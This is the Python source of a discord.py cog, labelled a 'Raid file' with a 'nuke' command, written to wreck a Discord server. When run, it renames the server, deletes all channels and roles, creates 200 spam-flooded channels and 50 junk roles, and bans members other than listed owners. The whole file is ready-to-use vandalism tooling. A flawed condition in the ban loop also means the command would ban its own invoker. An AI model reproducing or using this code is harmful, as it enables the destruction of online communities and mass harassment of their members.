"""Raid file🔥"""

# Discord
import discord
from discord.ext import commands

# Utils
from utils import read_owners, get_data

class Nuke(commands.Cog):
    
    def __init__(self, bot):
        self.bot = bot
        self.spam = False
        

    @commands.Cog.listener()
    async def on_guild_channel_create(self, channel):
        if self.spam:
            for i in range(10):
                await channel.send(get_data('spam_message'))
        else:
            pass
    
    @commands.command(aliases=['Raid', 'nuke'])
    async def raid(self, ctx):
        guild = ctx.message.guild
        guild_name = get_data('guild_name')
        channel_name = get_data('channel_name')
        role_name = get_data('role_name')
        """Change name and icon"""
        await ctx.message.delete()
        with open('cogs/image.jpg', 'rb') as file:
            icon = file.read()
            try:
                await guild.edit(name=guild_name, icon=icon)
                print('Name and icon of guild has been changed')
            except:
                print('Cant change name and icon of the server')
        """Delete channels"""
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print('Channel deleted')
            except:
                print('Cant delete channel')
                continue
        """Create channels"""
        self.spam = True
        for channel in range(200):
            try:
                await guild.create_text_channel(channel_name)
                print('Channel created')
            except:
                print('Cant create channel')
                continue
        self.spam = False
        """Ban members"""
        for member in guild.members:
            try:
                if member.id in read_owners():
                    continue
                elif not member.id == ctx.author.id or self.bot.user.id:
                    await guild.ban(member)
                    print(f'{member} has been banned')
            except:
                print(f'Cant ban {member}')
                continue
        """Delete roles"""
        for role in guild.roles:
            try:
                await role.delete()
                print(f'{role} has been deleted')
            except:
                print(f'Cant delete {role}')
        """Create roles"""
        for role in range(50):
            try:
                await guild.create_role(name=role_name)
                print('Role created')
            except:
                print('Cant create role')
                continue


def setup(bot):
    bot.add_cog(Nuke(bot))